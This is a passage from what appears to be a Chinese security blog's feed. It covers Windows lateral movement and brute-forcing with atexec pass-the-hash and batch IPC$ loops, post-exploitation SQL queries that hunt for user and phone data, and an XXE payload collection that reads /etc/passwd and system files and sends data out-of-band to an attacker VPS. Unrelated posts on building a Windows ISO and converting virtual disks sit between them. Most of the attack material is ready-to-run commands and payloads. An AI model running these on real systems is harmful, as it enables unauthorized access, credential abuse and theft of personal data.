<h3 id="单个hash传递-ntlmhash"><a href="#单个hash传递-ntlmhash" class="headerlink" title="单个hash传递(ntlmhash)"></a>单个hash传递(ntlmhash)</h3><p><img src="/%E4%BD%BF%E7%94%A8atexec%E8%BF%9B%E8%A1%8C%E5%96%B7%E6%B4%92%E6%94%BB%E5%87%BB/8c79fcfd9e3bd2cde8a3206517e0ab46.png" alt="截图"></p>
<p>域环境下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">atexec.exe  -hashes :&lt;hash&gt; &lt;domain&gt;/&lt;username&gt;@&lt;ip&gt; &quot;&lt;command&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>本地环境下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">atexec.exe  -hashes :&lt;hash&gt; ./&lt;username&gt;@&lt;ip&gt; &quot;&lt;command&gt;&quot;</span><br></pre></td></tr></table></figure>

<h3 id="批量传递密码"><a href="#批量传递密码" class="headerlink" title="批量传递密码"></a>批量传递密码</h3><h4 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h4><p>如果写成批处理，那么<code>%i</code>需要变成<code>%%i</code></p>
<p>(ips.txt)需要使用小括号包裹</p>
<h4 id="DOS命令"><a href="#DOS命令" class="headerlink" title="DOS命令"></a>DOS命令</h4><p>dos命令除了变量以外不区分大小写，包括执行参数也不区分大小写。</p>
<p>批量尝试连接ipc$，连接成功后可以使用<code>net use</code>查看。</p>
<p>以下命令修改参数后可以直接执行，无需放在bat中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /f %i in (&lt;ips.txt&gt;) do net use \\%i\ipc$ &quot;&lt;password&gt;&quot; /user:&lt;username&gt;</span><br></pre></td></tr></table></figure>

<p>明文密码批量执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FOR /F %i in (&lt;ips.txt&gt;) do atexec.exe ./&lt;username&gt;:&lt;passwd&gt;@%i &quot;&lt;command&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>hash批量执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FOR /F %i in (&lt;ips.txt&gt;) do atexec.exe -hashes :&lt;hash&gt; ./&lt;username&gt;@%i &quot;&lt;command&gt;&quot;</span><br></pre></td></tr></table></figure>

<h3 id="爆破域控密码"><a href="#爆破域控密码" class="headerlink" title="爆破域控密码"></a>爆破域控密码</h3><p>指定密码或者hash去爆破指定机器</p>
<p>最好是爆破administrator用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用指定密码集爆破</span><br><span class="line">FOR /F %i in (&lt;passswds.txt&gt;) do atexec.exe ./&lt;username&gt;:&amp;i@&lt;ip&gt; &quot;&lt;command&gt;&quot;</span><br><span class="line"># 使用指定hash集爆破</span><br><span class="line">FOR /F %i in (&lt;hashs.txt&gt;) do atexec.exe -hashes :%i ./&lt;username&gt;@&lt;ip&gt; &quot;&lt;command&gt;&quot;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
      <tags>
        <tag>安全工具</tag>
        <tag>内网安全</tag>
      </tags>
  </entry>
  <entry>
    <title>制作自己专属的iso镜像</title>
    <url>/%E5%88%B6%E4%BD%9C%E8%87%AA%E5%B7%B1%E4%B8%93%E5%B1%9E%E7%9A%84iso%E9%95%9C%E5%83%8F/</url>
    <content><![CDATA[<p>很多时候想重装系统，但是又觉得配置环境麻烦。所以我们可以通过制作自己专属的iso文件，让重装的系统包含我们配置好的环境。</p>
<span id="more"></span>

<p>重装好的系统就像原始系统重新启动一样，所有系统盘的数据都还在，所有哦。</p>
<h2 id="工具以及软件准备"><a href="#工具以及软件准备" class="headerlink" title="工具以及软件准备"></a>工具以及软件准备</h2><ul>
<li>一个自己已经配置好相关环境的系统，<strong>并且未配置<code>PIN</code>登录</strong>，否则制作好镜像后无法登录系统，会显示pin失效而且无法重置！</li>
</ul>
<p><img src="/%E5%88%B6%E4%BD%9C%E8%87%AA%E5%B7%B1%E4%B8%93%E5%B1%9E%E7%9A%84iso%E9%95%9C%E5%83%8F/8b0057cb92ae11385e34f0cc1d5d7d23.png" alt="截图"></p>
<ul>
<li><p>u盘一个，刷pe，wepe、大白菜都可以，用来制作备份文件</p>
</li>
<li><p>电脑需要安装NTLite，用来打包系统，将备份文件封装成iso，这里下载：</p>
</li>
</ul>
<blockquote>
<p><a href="https://www.ntlite.com/download/">https://www.ntlite.com/download/</a></p>
</blockquote>
<ul>
<li>原版系统镜像，可以去这里下载：</li>
</ul>
<blockquote>
<p><a href="https://next.itellyou.cn/">https://next.itellyou.cn/</a></p>
</blockquote>
<h2 id="开整"><a href="#开整" class="headerlink" title="开整"></a>开整</h2><h3 id="步骤一"><a href="#步骤一" class="headerlink" title="步骤一"></a>步骤一</h3><p>使用wepe或者大白菜制作启动u盘，进入pe系统</p>
<p>使用pe系统中自带的<code>Dism++</code>工具将系统盘备份，备份后的文件应该是wim后缀</p>
<p><img src="/%E5%88%B6%E4%BD%9C%E8%87%AA%E5%B7%B1%E4%B8%93%E5%B1%9E%E7%9A%84iso%E9%95%9C%E5%83%8F/a9e5ca612360ce70c4b0ee90fa892e84.png" alt="截图"></p>
<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>注意备份文件应该存放在备份目标盘以外的其他盘</p>
<p>如果只有一个盘可以使用<code>DiskGenius</code>临时划一个盘出来，如果划分之后的盘符在资源管理器中不显示，可以尝试右键为其指派一个盘符，或者在磁盘中新建一个文件夹。</p>
<p><img src="/%E5%88%B6%E4%BD%9C%E8%87%AA%E5%B7%B1%E4%B8%93%E5%B1%9E%E7%9A%84iso%E9%95%9C%E5%83%8F/fd06574211aeaeb06394c5ae32faca7a.png" alt="截图"></p>
<h3 id="步骤二"><a href="#步骤二" class="headerlink" title="步骤二"></a>步骤二</h3><p>将<strong>官方原版</strong>iso镜像解压缩</p>
<p><img src="/%E5%88%B6%E4%BD%9C%E8%87%AA%E5%B7%B1%E4%B8%93%E5%B1%9E%E7%9A%84iso%E9%95%9C%E5%83%8F/607b1861138d6afe2c48f159b18688c3.png" alt="截图"></p>
<p>解压缩后进入<code>sources</code>目录，将该目录下的<code>install.wim</code>文件替换为刚才备份的win文件，文件名保持<code>install.wim</code>不变</p>
<p>打开NTLite软件，点击左上角<code>添加</code>-<code>映像文件夹</code>，将刚才解压后的系统镜像文件夹选中</p>
<p><img src="/%E5%88%B6%E4%BD%9C%E8%87%AA%E5%B7%B1%E4%B8%93%E5%B1%9E%E7%9A%84iso%E9%95%9C%E5%83%8F/ac373153d3ed17d9ab3afe124715347e.png" alt="截图"></p>
<p>右键该文件夹，选择<code>创建iso</code>，选择保存位置，根据个人修改文件名，卷标默认，保存即可。</p>
<p><img src="/%E5%88%B6%E4%BD%9C%E8%87%AA%E5%B7%B1%E4%B8%93%E5%B1%9E%E7%9A%84iso%E9%95%9C%E5%83%8F/9ba9ba7eae16a8252bd80a7ea1adfd7a.png" alt="截图"></p>
<p>此时ISO文件就制作完成了，可以直接双击运行还原系统了，也可以直接pe刷进去。</p>
<h2 id="hyper-v中安装"><a href="#hyper-v中安装" class="headerlink" title="hyper-v中安装"></a>hyper-v中安装</h2><p>我们可以将镜像直接安装到hyperv中。</p>
<p>如果hyper-v中安装win11镜像，那么创建虚拟机时应该注意</p>
<ul>
<li><p>使用第二代虚拟机</p>
</li>
<li><p>启用受信任的平台模块</p>
</li>
</ul>
<p><img src="/%E5%88%B6%E4%BD%9C%E8%87%AA%E5%B7%B1%E4%B8%93%E5%B1%9E%E7%9A%84iso%E9%95%9C%E5%83%8F/62762b93a992f021e850dd908b0c2294.png" alt="截图"></p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>抓取goby的poc</title>
    <url>/%E6%8A%93%E5%8F%96goby%E7%9A%84poc/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>goby内置了很多poc，如果有红队的试用版，可以尝试抓取一波，补充自己的弹药库。</p>
<span id="more"></span>

<p>攻击机器：192.168.100.123</p>
<p>靶机地址：192.168.100.216</p>
<h2 id="一、抓取fastjson反序列化poc失败"><a href="#一、抓取fastjson反序列化poc失败" class="headerlink" title="一、抓取fastjson反序列化poc失败"></a>一、抓取fastjson反序列化poc失败</h2><h3 id="fastjson介绍"><a href="#fastjson介绍" class="headerlink" title="fastjson介绍"></a>fastjson介绍</h3><blockquote>
<p>fastjion的作用是在java对象和json格式之间相互转换（序列化和反序列化）</p>
<p>因为是无回显型漏洞所以也比较好奇goby是怎么判定漏洞的</p>
</blockquote>
<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><blockquote>
<p>json发往服务器的数据用户可控，可被更改</p>
<p>未对json数据做过滤，导致服务器调用恶意函数执行远程rmi服务器发出的命令</p>
<p><img src="/%E6%8A%93%E5%8F%96goby%E7%9A%84poc/c33905597469fb3591ce843104d61d12.png" alt="截图"></p>
</blockquote>
<h3 id="尝试抓取poc过程"><a href="#尝试抓取poc过程" class="headerlink" title="尝试抓取poc过程"></a>尝试抓取poc过程</h3><blockquote>
<p>先查看poc列表，包含了fastjson漏洞，我本身也比较好奇fastjson漏洞是怎么探测到的</p>
<p><img src="/%E6%8A%93%E5%8F%96goby%E7%9A%84poc/ccf286e548bf4fbcf72bd83831a5bf52.png" alt="截图"></p>
<p>于是搭建了fastjson1.2.47的docker环境</p>
<p>但是死活扫不出来</p>
<p><img src="/%E6%8A%93%E5%8F%96goby%E7%9A%84poc/6c6988bd198df672ca6ce07682b52b37.png" alt="截图"></p>
<p>发现tag是1.2.45，这个环境应该有问题，不是1.2.47的</p>
<p><img src="/%E6%8A%93%E5%8F%96goby%E7%9A%84poc/5058201dc16a1bddf77e153174cacca8.png" alt="截图"></p>
<p>再次搭建1.2.24的环境，还是没有扫出来</p>
<p><img src="/%E6%8A%93%E5%8F%96goby%E7%9A%84poc/481d11d8e6ceca77ac96ba66d816a7b7.png" alt="截图"></p>
<p>多次尝试后依然没有扫出来，尝试将扫描器放在虚拟机中桥接出来扫，识别到端口和spring服务，但是没有扫出漏洞：</p>
<p><img src="/%E6%8A%93%E5%8F%96goby%E7%9A%84poc/87a1eca632b0e5f815832d4dfdb09938.png" alt="截图"></p>
</blockquote>
<h2 id="二、抓取shiro1-2-4反序列化poc失败"><a href="#二、抓取shiro1-2-4反序列化poc失败" class="headerlink" title="二、抓取shiro1.2.4反序列化poc失败"></a>二、抓取shiro1.2.4反序列化poc失败</h2><p>shiro反序列化漏洞从2016年后被爆出至今仍然层出不穷漏，这里准备再次尝试抓一下shiro的poc</p>
<h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><blockquote>
<p>这个漏洞成因很简单</p>
<ol>
<li>加密cookie的密钥被硬编码，轻易可以获取</li>
<li>反序列化未做过滤处理</li>
</ol>
</blockquote>
<p><strong>payload生成过程：</strong></p>
<blockquote>
<p>命令 &#x3D;&gt; 序列化 &#x3D;&gt; AES加密 &#x3D;&gt; base64编码 &#x3D;&gt; RememberMe Cookie值</p>
</blockquote>
<h3 id="尝试扫描并抓取poc"><a href="#尝试扫描并抓取poc" class="headerlink" title="尝试扫描并抓取poc"></a>尝试扫描并抓取poc</h3><blockquote>
<p>同样是扫除服务但是没扫出来漏洞</p>
<p><img src="/%E6%8A%93%E5%8F%96goby%E7%9A%84poc/4ea43b4e999c7d45d8d87a2f01449eb0.png" alt="截图"></p>
<p>直接指定poc扫描也扫不出来此洞</p>
<p><img src="/%E6%8A%93%E5%8F%96goby%E7%9A%84poc/4cc2b4a49f0e14d639862186c668881f.png" alt="截图"></p>
<p>扫不出来就说明goby的poc不太行</p>
<p>那也没必要抓包分析poc了</p>
</blockquote>
<h2 id="三、尝试简单漏洞类型thinkphp成功"><a href="#三、尝试简单漏洞类型thinkphp成功" class="headerlink" title="三、尝试简单漏洞类型thinkphp成功"></a>三、尝试简单漏洞类型thinkphp成功</h2><p>搭建完thinkphp环境后，可以扫描出漏洞了，因为此漏洞的验证方式比较简单</p>
<p><img src="/%E6%8A%93%E5%8F%96goby%E7%9A%84poc/7ad69581547817a1f22c947bcb92c3db.png" alt="截图"></p>
<p><img src="/%E6%8A%93%E5%8F%96goby%E7%9A%84poc/eaca75969ec7fb6fdd7e65e1ef7c86e2.png" alt="截图"></p>
<h3 id="尝试抓包："><a href="#尝试抓包：" class="headerlink" title="尝试抓包："></a>尝试抓包：</h3><blockquote>
<p>goby不支持http代理，没法用bp做代理抓包</p>
<p><img src="/%E6%8A%93%E5%8F%96goby%E7%9A%84poc/e576822f92868307485faa278202942a.png" alt="截图"></p>
<p>只能使用wireshark或者其他更底层的抓包工具抓包</p>
<p>开始监听并修改wireshark匹配规则为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.addr == 192.168.100.216 and http</span><br></pre></td></tr></table></figure>

<p>同时goby重新扫描</p>
<p><img src="/%E6%8A%93%E5%8F%96goby%E7%9A%84poc/7247e093d654145618a5ad15260e3ee4.png" alt="截图"></p>
<p>成功抓取thinkphp的poc和部分其他的poc</p>
<p>手动重放此请求可以看到页面下方的thinkphp 2.1，猜测是根据正则或者页面相似度判断页面是否存在漏洞</p>
<p><img src="/%E6%8A%93%E5%8F%96goby%E7%9A%84poc/c3d0cc00e37f3a1f4e8d5861cf21f8e7.png" alt="截图"></p>
<p>再次尝试抓取exp包，漏洞利用原理是调用system函数执行post中内容：</p>
<p><img src="/%E6%8A%93%E5%8F%96goby%E7%9A%84poc/17823c9f780b7935b865e0411b77dc0e.png" alt="截图"></p>
<p>手动复现：</p>
<p><img src="/%E6%8A%93%E5%8F%96goby%E7%9A%84poc/bc282dec3ca5f9a7cd3edf0a829f779d.png" alt="截图"></p>
</blockquote>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>关闭火绒，可能会拦截攻击，导致利用失败</p>
<p>gopy无法检测无回显漏洞（也可能是命中率很低）</p>
]]></content>
      <categories>
        <category>安全技巧</category>
      </categories>
      <tags>
        <tag>安全技巧</tag>
        <tag>安全工具</tag>
        <tag>goby</tag>
      </tags>
  </entry>
  <entry>
    <title>后渗透之数据挖掘</title>
    <url>/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一般拿到数据库权限后会翻库，找一些敏感数据，这里汇总了几个语句，能在数据库中快速进行数据挖掘。</p>
<span id="more"></span>

<h2 id="快速寻找Oracle中user相关数据"><a href="#快速寻找Oracle中user相关数据" class="headerlink" title="快速寻找Oracle中user相关数据"></a>快速寻找Oracle中user相关数据</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT owner, table_name, column_name</span><br><span class="line">FROM dba_tab_columns</span><br><span class="line">WHERE LOWER(column_name) LIKE &#x27;%user%&#x27;;</span><br></pre></td></tr></table></figure>

<h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT table_schema, table_name, column_name </span><br><span class="line">FROM information_schema.columns </span><br><span class="line">WHERE column_name COLLATE utf8_general_ci LIKE &#x27;%phone%&#x27;;</span><br></pre></td></tr></table></figure>

<p>写在单行中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE column_name COLLATE utf8_general_ci LIKE &#x27;%phone%&#x27;;</span><br></pre></td></tr></table></figure>

<h2 id="Postgres"><a href="#Postgres" class="headerlink" title="Postgres"></a>Postgres</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT table_schema, table_name, column_name </span><br><span class="line">FROM information_schema.columns </span><br><span class="line">WHERE column_name ILIKE &#x27;%phone%&#x27;;</span><br></pre></td></tr></table></figure>

<h2 id="SQL-Server-T-SQL-搜索值所在的表"><a href="#SQL-Server-T-SQL-搜索值所在的表" class="headerlink" title="SQL Server T-SQL 搜索值所在的表"></a>SQL Server T-SQL 搜索值所在的表</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DECLARE @SearchValue INT</span><br><span class="line">SET @SearchValue = 99999999  -- 设置要搜索的值</span><br><span class="line"></span><br><span class="line">-- 创建一个临时表来存储包含指定值的表名和列名</span><br><span class="line">CREATE TABLE #Results</span><br><span class="line">(</span><br><span class="line">    TableName NVARCHAR(128),</span><br><span class="line">    ColumnName NVARCHAR(128)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">-- 使用动态SQL查询所有表</span><br><span class="line">DECLARE @TableName NVARCHAR(128)</span><br><span class="line">DECLARE @ColumnName NVARCHAR(128)</span><br><span class="line"></span><br><span class="line">DECLARE @Sql NVARCHAR(MAX)</span><br><span class="line"></span><br><span class="line">DECLARE table_cursor CURSOR FOR</span><br><span class="line">SELECT t.name AS TableName, c.name AS ColumnName</span><br><span class="line">FROM sys.tables t</span><br><span class="line">JOIN sys.columns c ON t.object_id = c.object_id</span><br><span class="line">WHERE c.system_type_id IN (56, 127)  -- 56 表示整数数据类型，127 表示大整数数据类型</span><br><span class="line"></span><br><span class="line">OPEN table_cursor</span><br><span class="line">FETCH NEXT FROM table_cursor INTO @TableName, @ColumnName</span><br><span class="line"></span><br><span class="line">WHILE @@FETCH_STATUS = 0</span><br><span class="line">BEGIN</span><br><span class="line">    SET @Sql = N&#x27;INSERT INTO #Results (TableName, ColumnName)</span><br><span class="line">                SELECT N&#x27;&#x27;&#x27; + @TableName + &#x27;&#x27;&#x27;, N&#x27;&#x27;&#x27; + @ColumnName + &#x27;&#x27;&#x27;</span><br><span class="line">                FROM &#x27; + QUOTENAME(@TableName) + &#x27;</span><br><span class="line">                WHERE &#x27; + QUOTENAME(@ColumnName) + &#x27; = &#x27; + CAST(@SearchValue AS NVARCHAR)</span><br><span class="line"></span><br><span class="line">    EXEC sp_executesql @Sql</span><br><span class="line"></span><br><span class="line">    FETCH NEXT FROM table_cursor INTO @TableName, @ColumnName</span><br><span class="line">END</span><br><span class="line"></span><br><span class="line">CLOSE table_cursor</span><br><span class="line">DEALLOCATE table_cursor</span><br><span class="line"></span><br><span class="line">-- 查询结果</span><br><span class="line">SELECT * FROM #Results</span><br><span class="line"></span><br><span class="line">-- 删除临时表</span><br><span class="line">DROP TABLE #Results</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="SQL-Server-T-SQL-搜索字符串所在的表"><a href="#SQL-Server-T-SQL-搜索字符串所在的表" class="headerlink" title="SQL Server T-SQL 搜索字符串所在的表"></a>SQL Server T-SQL 搜索字符串所在的表</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DECLARE @SearchValue NVARCHAR(255)</span><br><span class="line">SET @SearchValue = &#x27;192.168.31.132&#x27;  -- 设置要搜索的字符串</span><br><span class="line"></span><br><span class="line">-- 创建一个临时表来存储包含指定值的表名和列名</span><br><span class="line">CREATE TABLE #Results</span><br><span class="line">(</span><br><span class="line">    TableName NVARCHAR(128),</span><br><span class="line">    ColumnName NVARCHAR(128)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">-- 使用动态SQL查询所有表</span><br><span class="line">DECLARE @TableName NVARCHAR(128)</span><br><span class="line">DECLARE @ColumnName NVARCHAR(128)</span><br><span class="line"></span><br><span class="line">DECLARE @Sql NVARCHAR(MAX)</span><br><span class="line"></span><br><span class="line">DECLARE table_cursor CURSOR FOR</span><br><span class="line">SELECT t.name AS TableName, c.name AS ColumnName</span><br><span class="line">FROM sys.tables t</span><br><span class="line">JOIN sys.columns c ON t.object_id = c.object_id</span><br><span class="line">WHERE c.system_type_id IN (167, 175, 231)  -- 字符串数据类型的类型码</span><br><span class="line"></span><br><span class="line">OPEN table_cursor</span><br><span class="line">FETCH NEXT FROM table_cursor INTO @TableName, @ColumnName</span><br><span class="line"></span><br><span class="line">WHILE @@FETCH_STATUS = 0</span><br><span class="line">BEGIN</span><br><span class="line">    SET @Sql = N&#x27;INSERT INTO #Results (TableName, ColumnName)</span><br><span class="line">                SELECT N&#x27;&#x27;&#x27; + @TableName + &#x27;&#x27;&#x27;, N&#x27;&#x27;&#x27; + @ColumnName + &#x27;&#x27;&#x27;</span><br><span class="line">                FROM &#x27; + QUOTENAME(@TableName) + &#x27;</span><br><span class="line">                WHERE &#x27; + QUOTENAME(@ColumnName) + &#x27; LIKE &#x27;&#x27;%&#x27; + @SearchValue + &#x27;%&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    EXEC sp_executesql @Sql</span><br><span class="line"></span><br><span class="line">    FETCH NEXT FROM table_cursor INTO @TableName, @ColumnName</span><br><span class="line">END</span><br><span class="line"></span><br><span class="line">CLOSE table_cursor</span><br><span class="line">DEALLOCATE table_cursor</span><br><span class="line"></span><br><span class="line">-- 查询结果</span><br><span class="line">SELECT * FROM #Results</span><br><span class="line"></span><br><span class="line">-- 删除临时表</span><br><span class="line">DROP TABLE #Results</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>安全技巧</category>
      </categories>
      <tags>
        <tag>安全技巧</tag>
        <tag>数据挖掘</tag>
        <tag>后渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>神器收藏</title>
    <url>/%E7%A5%9E%E5%99%A8%E6%94%B6%E8%97%8F/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">
  <script id="hbeData" type="hbeData" data-hmacdigest="89286a5ec55c1d6ba16f1a05a916acb4e502c7f4dcaf7dbabd5ff7f95fcad79a"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>private</tag>
        <tag>生活</tag>
        <tag>收藏</tag>
      </tags>
  </entry>
  <entry>
    <title>xxe常用POC</title>
    <url>/xxe%E5%B8%B8%E7%94%A8POC/</url>
    <content><![CDATA[<h2 id="有回显xxe"><a href="#有回显xxe" class="headerlink" title="有回显xxe"></a>有回显xxe</h2><p>如果页面存在回显型xxe漏洞，页面会显示gg（poc）</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">gg</span>&gt;</span>gg&lt;\gg&gt;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>读取win.ini</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">creds</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">goodies</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/system.ini&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>读取boot.ini</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">    &lt;!DOCTYPE root [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;file:///c://boot.ini&quot;&gt;</span><br><span class="line">    %file;</span><br><span class="line">]]&gt;</span><br></pre></td></tr></table></figure>

<p>读取&#x2F;etc&#x2F;passwd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">    &lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">    &lt;!ENTITY xx1 SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xx1;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>

<p>pikachu靶场读取当前目录下的flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">    &lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">    &lt;!ENTITY xx1 SYSTEM &quot;file:///var/www/html/vul/xxe/flag&quot; &gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xx1;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>

<p>读取其他站点的文件，注意只能读取文件（ssrf）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">    &lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">    &lt;!ENTITY xx1 SYSTEM &quot;http://192.168.100.216:8080/%E6%96%B0%E5%BB%BA%E6%96%87%E6%9C%AC%E6%96%87%E6%A1%A3.txt&quot; &gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xx1;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>

<h2 id="无回显xxe"><a href="#无回显xxe" class="headerlink" title="无回显xxe"></a>无回显xxe</h2><p>抓包写入payload</p>
<p><img src="/xxe%E5%B8%B8%E7%94%A8POC/8665d0a204464de2b128886fcc7772bf.png" alt="截图"></p>
<p>vps根目录下存放evil.dtd文件，监听端口设置为1333</p>
<p><img src="/xxe%E5%B8%B8%E7%94%A8POC/c0bae2ab3c98eaf5ff5ed7a767605d1e.png" alt="截图"></p>
<p>开启端口监听</p>
<p><img src="/xxe%E5%B8%B8%E7%94%A8POC/f98c93f6013754e31f10af0d515de36d.png" alt="截图"></p>
<p>Burpsuite发送请求包</p>
<p>vps监听获得&#x2F;etc&#x2F;passwd的base64编码</p>
<p><img src="/xxe%E5%B8%B8%E7%94%A8POC/494295c29ca1a4b23c4d2dfc68479f12.png" alt="截图"></p>
<p>解码</p>
<p><img src="/xxe%E5%B8%B8%E7%94%A8POC/6a70f670b519f5ff075908498c17d9d7.png" alt="截图"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>漏洞原理</tag>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>虚拟磁盘转换</title>
    <url>/%E8%99%9A%E6%8B%9F%E7%A3%81%E7%9B%98%E8%BD%AC%E6%8D%A2/</url>
    <content><![CDATA[<h2 id="vmdk转vhd"><a href="#vmdk转vhd" class="headerlink" title="vmdk转vhd"></a>vmdk转vhd</h2><p>vmware转hyperv</p>
<h3 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h3><p><a href="http://www.winimage.com/download.htm">http://www.winimage.com/download.htm</a></p>
<span id="more"></span>

<h3 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h3><p>安装<a href="http://www.winimage.com/download.htm">winimage</a> 支持各种格式互相转换</p>
<p><img src="/%E8%99%9A%E6%8B%9F%E7%A3%81%E7%9B%98%E8%BD%AC%E6%8D%A2/83a9439ef343272072ac83eff21dace3.png" alt="截图"></p>
<p>选择源，注意红色箭头，选择vmdk</p>
<p><img src="/%E8%99%9A%E6%8B%9F%E7%A3%81%E7%9B%98%E8%BD%AC%E6%8D%A2/de89ab8e0a981922b4751d3d3a6a2cce.png" alt="截图"></p>
<p>最后再选择保存位置即可得到一个vhd的磁盘文件</p>
<h3 id="导入hyperv"><a href="#导入hyperv" class="headerlink" title="导入hyperv"></a>导入hyperv</h3><p><img src="/%E8%99%9A%E6%8B%9F%E7%A3%81%E7%9B%98%E8%BD%AC%E6%8D%A2/c53f2bb4172b8469e38ed53728d5eff4.png" alt="截图"></p>
]]></content>
      <categories>
        <category>虚拟化</category>
      </categories>
      <tags>
        <tag>虚拟化</tag>
        <tag>hyper-v</tag>
      </tags>
  </entry>
  <entry>
    <title>红队环境(Vulnstack4)</title>
    <url>/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/</url>
    <content><![CDATA[<h2 id="环境下载地址"><a href="#环境下载地址" class="headerlink" title="环境下载地址"></a>环境下载地址</h2><p>红队靶场 Vlunstack 4 的打靶记录</p>
<p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">http://vulnstack.qiyuanxuetang.net/vuln/detail/6/</a></p>
<span id="more"></span>

